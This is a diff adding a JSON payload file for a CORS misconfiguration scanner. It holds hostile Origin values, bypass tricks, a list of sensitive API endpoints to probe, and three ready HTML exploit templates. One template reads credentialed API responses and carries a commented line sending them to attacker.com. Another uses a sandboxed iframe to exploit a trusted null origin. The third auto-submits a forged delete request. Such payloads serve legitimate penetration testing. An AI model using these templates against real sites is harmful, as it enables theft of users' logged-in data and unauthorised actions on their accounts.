@@ -1,0 +1,170 @@
+{
+  "metadata": {
+    "name": "CORS Misconfiguration Payloads",
+    "version": "1.0.0",
+    "description": "CORS testing payloads for REVUEX CORS Scanner GOLD",
+    "author": "REVUEX Team"
+  },
+  "origin_tests": {
+    "description": "Origin header test values",
+    "null_origin": {
+      "description": "Null origin trust test",
+      "origin": "null",
+      "severity": "critical",
+      "exploitation": "Sandboxed iframes, data: URLs"
+    },
+    "wildcard_subdomain": {
+      "description": "Wildcard subdomain trust patterns",
+      "origins": [
+        "https://evil.TARGET.com",
+        "https://attacker.TARGET.com",
+        "https://TARGET.com.evil.com",
+        "https://TARGETcom.evil.com",
+        "https://attackerTARGET.com",
+        "https://TARGET.com.attacker.com"
+      ],
+      "severity": "high"
+    },
+    "prefix_suffix_bypass": {
+      "description": "Prefix/suffix based bypasses",
+      "origins": [
+        "https://evil-TARGET.com",
+        "https://TARGET.com-evil.com",
+        "https://prefixTARGET.com",
+        "https://TARGET.comsuffix.com",
+        "https://xxxxTARGET.com",
+        "https://TARGET.comxxxx"
+      ],
+      "severity": "high"
+    },
+    "protocol_downgrade": {
+      "description": "Protocol downgrade tests",
+      "origins": [
+        "http://TARGET.com",
+        "http://www.TARGET.com"
+      ],
+      "severity": "medium"
+    },
+    "special_characters": {
+      "description": "Special character injection",
+      "origins": [
+        "https://TARGET.com%60.evil.com",
+        "https://TARGET.com`.evil.com",
+        "https://TARGET.com&.evil.com",
+        "https://TARGET.com#.evil.com",
+        "https://TARGET.com\\.evil.com",
+        "https://TARGET.com/.evil.com"
+      ],
+      "severity": "medium"
+    },
+    "reflection_test": {
+      "description": "Origin reflection test",
+      "origin": "https://attacker.com",
+      "severity": "critical"
+    }
+  },
+  "exploitation_templates": {
+    "description": "Exploitation HTML templates",
+    "basic_cors_steal": {
+      "description": "Basic CORS data theft",
+      "html": "<!DOCTYPE html>\n<html>\n<head><title>CORS PoC</title></head>\n<body>\n<script>\nvar req = new XMLHttpRequest();\nreq.onreadystatechange = function() {\n  if (req.readyState == 4 && req.status == 200) {\n    document.write('<pre>' + req.responseText + '</pre>');\n    // Exfiltrate: new Image().src = 'https://attacker.com/log?data=' + btoa(req.responseText);\n  }\n};\nreq.open('GET', 'https://TARGET.com/api/sensitive', true);\nreq.withCredentials = true;\nreq.send();\n</script>\n</body>\n</html>"
+    },
+    "null_origin_exploit": {
+      "description": "Null origin exploitation via iframe",
+      "html": "<!DOCTYPE html>\n<html>\n<head><title>Null Origin CORS PoC</title></head>\n<body>\n<iframe sandbox=\"allow-scripts\" srcdoc=\"\n<script>\nvar req = new XMLHttpRequest();\nreq.onreadystatechange = function() {\n  if (req.readyState == 4 && req.status == 200) {\n    parent.postMessage(req.responseText, '*');\n  }\n};\nreq.open('GET', 'https://TARGET.com/api/sensitive', true);\nreq.withCredentials = true;\nreq.send();\n</script>\n\"></iframe>\n<script>\nwindow.addEventListener('message', function(e) {\n  document.write('<pre>' + e.data + '</pre>');\n}, false);\n</script>\n</body>\n</html>"
+    },
+    "preflight_bypass": {
+      "description": "Preflight bypass with simple request",
+      "html": "<!DOCTYPE html>\n<html>\n<head><title>Simple Request CORS</title></head>\n<body>\n<form id=\"cors-form\" action=\"https://TARGET.com/api/action\" method=\"POST\" enctype=\"text/plain\">\n<input type=\"hidden\" name=\"{&quot;action&quot;:&quot;delete&quot;,&quot;id&quot;:&quot;\" value=\"123&quot;}\">\n</form>\n<script>document.getElementById('cors-form').submit();</script>\n</body>\n</html>"
+    }
+  },
+  "headers_to_check": {
+    "description": "Response headers to analyze",
+    "cors_headers": [
+      "Access-Control-Allow-Origin",
+      "Access-Control-Allow-Credentials",
+      "Access-Control-Allow-Methods",
+      "Access-Control-Allow-Headers",
+      "Access-Control-Expose-Headers",
+      "Access-Control-Max-Age"
+    ],
+    "dangerous_combinations": [
+      {
+        "headers": {
+          "Access-Control-Allow-Origin": "*",
+          "Access-Control-Allow-Credentials": "true"
+        },
+        "severity": "critical",
+        "note": "Invalid per spec but some browsers may be vulnerable"
+      },
+      {
+        "headers": {
+          "Access-Control-Allow-Origin": "null",
+          "Access-Control-Allow-Credentials": "true"
+        },
+        "severity": "critical",
+        "note": "Exploitable via sandboxed iframe"
+      },
+      {
+        "headers": {
+          "Access-Control-Allow-Origin": "<reflected>",
+          "Access-Control-Allow-Credentials": "true"
+        },
+        "severity": "critical",
+        "note": "Full credential theft possible"
+      }
+    ]
+  },
+  "sensitive_endpoints": {
+    "description": "Common sensitive endpoints to test",
+    "endpoints": [
+      "/api/user",
+      "/api/me",
+      "/api/profile",
+      "/api/account",
+      "/api/settings",
+      "/api/admin",
+      "/api/users",
+      "/api/config",
+      "/api/keys",
+      "/api/tokens",
+      "/api/secrets",
+      "/api/credentials",
+      "/api/billing",
+      "/api/payments",
+      "/graphql",
+      "/api/v1/user",
+      "/api/v2/user"
+    ]
+  },
+  "bypass_techniques": {
+    "description": "CORS bypass techniques",
+    "techniques": [
+      {
+        "name": "Case variation",
+        "example": "https://TARGET.COM",
+        "note": "Some servers may be case-insensitive"
+      },
+      {
+        "name": "URL encoding",
+        "example": "https://TARGET%2ecom",
+        "note": "Parser confusion"
+      },
+      {
+        "name": "Port variation",
+        "example": "https://TARGET.com:443",
+        "note": "Explicit default port"
+      },
+      {
+        "name": "Authentication in URL",
+        "example": "https://user:pass@TARGET.com",
+        "note": "May bypass origin checks"
+      },
+      {
+        "name": "IPv6",
+        "example": "https://[::1]",
+        "note": "IPv6 localhost"
+      }
+    ]
+  }
+}
